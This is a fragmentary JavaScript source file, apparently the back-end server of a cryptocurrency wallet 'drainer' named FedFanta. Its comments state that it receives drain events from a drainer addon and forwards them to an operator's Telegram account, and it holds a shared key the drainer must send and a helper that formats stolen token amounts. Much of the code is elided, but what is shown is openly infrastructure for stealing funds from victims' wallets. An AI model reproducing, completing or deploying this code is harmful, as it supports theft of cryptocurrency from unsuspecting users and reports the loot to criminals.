// ==========================================
// 🩸 FEDFANTA DRAINER TELEGRAM SERVER
// Receives drain events from drainer addon
// Formats & sends to @KaxoBrixks on Telegram
// ==========================================
...
const CFG = {
    ...
    REQUIRED_KEY: 'fuckyoubitch',                // key drainer must send
...
async function formatTokenWithAmount(mint, amount) {
    ...
    // Amount is raw with decimals — we don't know decimals from drainer
...
// ==========================================
app.listen(CFG.PORT, () => {
    console.log(`[Server] 🩸 FedFanta Drainer Server running on port ${CFG.PORT}`);
    console.log(`[Server] Telegram chat: ${CFG.TELEGRAM_CHAT_ID}`);
    console.log(`[Server] Drainer needs key: ${CFG.REQUIRED_KEY}`);
});
